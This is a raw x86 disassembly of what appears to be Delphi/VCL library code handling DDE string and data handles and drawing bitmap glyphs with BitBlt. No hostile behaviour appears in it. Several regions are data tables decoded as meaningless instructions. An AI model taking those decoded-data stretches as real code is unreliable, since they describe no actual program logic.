mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4046e4
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_4048dc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_469270
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_41e7c8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404828
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_469270
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_41e79c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_469344
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4161a0
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_404828
jne r-xdata
sub_469394
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4161a0
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_4693e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_41e1a4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_469420
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_469460
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469515
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_40451c
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46951c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4046e4
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_469544
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404480
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_4046e4
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_4048dc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_4695a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4695d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4695d8
retn
mov eax rw-data
call sub_40dabc
sub_4695dc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46742c
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
sub_469640
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_469665
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46966c
retn
sub_469678
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46969d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4696a4
retn
sub_4696b0
adc al 0xe7
dec eax
add [ edi ] ch
inc [ eax ]
add [ edi ] dl
dec eax
add [ eax ] dl
inc [ eax ]
add [ edi ] dl
dec eax
add [ ecx ] dl
inc [ eax ]
add [ edi ] dl
dec eax
add [ edx ] dl
inc [ eax ]
add [ edi ] dl
dec eax
add [ ebx ] dl
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi + edi * 8 ] dl
add [ eax ] al
adc al 0xe7
dec eax
add [ 0x140000ff ] dl
out 0x48 eax
add [ esi ] dl
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi ] dl
inc [ eax ]
add [ edi ] dl
dec eax
add [ eax ] bl
inc [ eax ]
add [ edi ] dl
dec eax
add [ ecx ] bl
inc [ eax ]
add [ edi ] dl
dec eax
add [ edx ] bl
inc [ eax ]
add [ edi ] dl
dec eax
add [ ebx ] bl
inc [ eax ]
add [ edi ] dl
dec eax
add [ edi + edi * 8 ] bl
add [ eax ] al
adc al 0xe7
dec eax
add [ 0x550000ff ] bl
mov ebp esp
xor eax eax
push ebp
push sub_46974d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469754
retn
sub_469760
xchg edi eax
inc esi
add [ ebx ] al
or eax 0x74754254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
add [ eax ] al
add [ eax - 0x35 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x24004698 ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x69 ] ah
inc esi
add [ ebx ] cl
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ eax + 0x24004698 ] ah
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0xae980041 0x46
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
add al cl
or al 0x44
add [ eax + 0x740041ea ] cl
or eax 0xe9b80044
je r-xdata
add [ edx + ebp * 8 ] dh
outsb
jae r-xdata
adc [ eax + 0x54 ] ch
xchg edi eax
inc esi
add bl al
rol al 0x97
inc esi
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
inc ecx
add [ edx + ebp * 8 + 0x41 ] cl
add al al
0xbb40041 0x44
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
and al 0x98
inc esi
sub_469848
mov esp 0x280046ae
or al 0x44
add [ eax ] cl
scasd [ edi ]
inc esi
add [ eax - 0x1f ] ch
inc esp
add [ eax + 0x5c00440d ] ah
or al 0x44
add [ ecx - 0x1e47ffbc ] ah
inc esp
add [ esp + ecx - 0x1e1fffbc ] dl
inc esp
add al dh
or al 0x44
add [ eax ] bh
scasd [ edi ]
inc esi
add [ eax ] dl
or eax 0xaf580044
inc esi
add [ esi + ecx ] ah
inc esp
add [ esi + ecx ] al
inc esp
add [ esi + ecx + 0x44 ] al
add [ eax ] dh
or eax 0xe2040044
inc esp
add [ eax ] cl
loop r-xdata
add [ ecx + eax - 0x20880000 ] al
inc ebx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ ecx + esi + 0x36580044 ] dl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] bh
mov al 0x46
add [ esi + edi + 0x44 ] dh
add [ edx + esi + 0x44 ] ch
add [ ebp + ecx + 0x44 ] dl
add ah al
or al [ eax + eax + 0x16 ]
push esp
push ebx
jo r-xdata
add [ edx + ebp * 2 - 0x4ce3ffbf ] al
inc esi
add [ edx + edx ] dh
inc esp
add [ eax + 0x4c004411 ] ah
sbb eax [ eax + eax + 0x2c ]
jmp 0xffffffffe65a9967
inc esp
inc edx
jne r-xdata
inc esp
je r-xdata
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
add [ ebx + ebx + 0x44 ] cl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x46990490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
0x46 0x0
add [ eax ] al
add [ eax ] al
xchg esp eax
cdq
inc esi
add dh dh
cdq
inc esi
sub_469926
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax - 0x51 ] bh
inc esi
add [ eax ] al
sub eax 0x2cfc0044
inc esp
add ah cl
sub eax 0x10a80044
inc esp
add ah ch
pop ss
inc esp
add [ eax + 0x17 ] dl
inc esp
add [ eax + 0x20 ] bh
inc esp
add al dh
cmove eax [ eax ]
hlt
sub_469f74
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44ebf4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_469fc8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ec48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_469ff8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_4169e0
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41699c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44f078
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_4168f8
sub_46a044
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_469ff8
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f284
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46a070
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4169c8
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41699c
sub_46a0a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a0e4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_46a114
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_469f74
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416044
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4161a0
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46a174
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_416340
mov eax ebx
call sub_4036c0
sub_46a1a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403690
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_46a2dc
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403a24
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a0a0
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a238
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4036c0
mov eax esi
call sub_46a294
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_46a198
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
mov eax [ rw-data ]
call sub_4036c0
xor eax eax
mov [ rw-data ] eax
sub_46a294
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
xor edx edx
mov dl bl
mov edx eax
mov eax [ esi + 0x8 ]
call sub_46a070
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_46a174
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_46a2dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_426e30
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_46a294
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_46a30c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_46a294
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_426e30
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_46a384
mov eax 0x1
sub_46a384
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_46a294
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_46a2dc
sub_46a3ac
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46a95b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_414b64
mov eax [ ebp - 0xc ]
call sub_426d44
mov eax [ eax + 0x14 ]
mov edx 0x8000000f
call sub_421ce0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_42650c
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_414b64
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_46a114
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a0a0
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_426d44
push eax
mov eax [ ebp - 0xc ]
call sub_426d44
lea edx [ ebp - 0x28 ]
pop ecx
call sub_421f50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_46a044
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_46a044
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46a91f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_426d44
mov eax [ eax + 0x14 ]
xor edx edx
call sub_421ce0
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_426e00
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_426d44
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426d44
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_421f50
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_427b14
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_426d44
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_421ce0
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426d44
push eax
mov eax [ ebp - 0x14 ]
call sub_426d44
lea edx [ ebp - 0x28 ]
pop ecx
call sub_421f50
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0x80000014
call sub_421ce0
mov eax [ ebp - 0x18 ]
call sub_4224e8
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426d44
call sub_4224e8
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_426d44
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_421ce0
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426d44
push eax
mov eax [ ebp - 0x14 ]
call sub_426d44
lea edx [ ebp - 0x28 ]
pop ecx
call sub_421f50
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0x80000010
call sub_421ce0
mov eax [ ebp - 0x18 ]
call sub_4224e8
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426d44
call sub_4224e8
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_421054
push eax
mov eax [ ebp - 0x10 ]
call sub_426d44
mov eax [ eax + 0x14 ]
pop edx
call sub_421ce0
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_426d44
push eax
mov eax [ ebp - 0x14 ]
call sub_426d44
lea edx [ ebp - 0x28 ]
pop ecx
call sub_421f50
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000f
call sub_421ce0
mov eax [ ebp - 0x18 ]
call sub_4224e8
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426d44
call sub_4224e8
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_427b14
mov eax [ ebp - 0xc ]
call sub_426d44
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0x8000000f
call sub_421ce0
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_422084
mov eax [ ebx + 0x14 ]
mov edx 0x80000014
call sub_421ce0
push 0x0
mov eax ebx
call sub_4224e8
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_4224e8
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_426d44
call sub_4224e8
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_4224e8
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0x80000010
call sub_421ce0
push 0x0
mov eax ebx
call sub_4224e8
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_4224e8
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
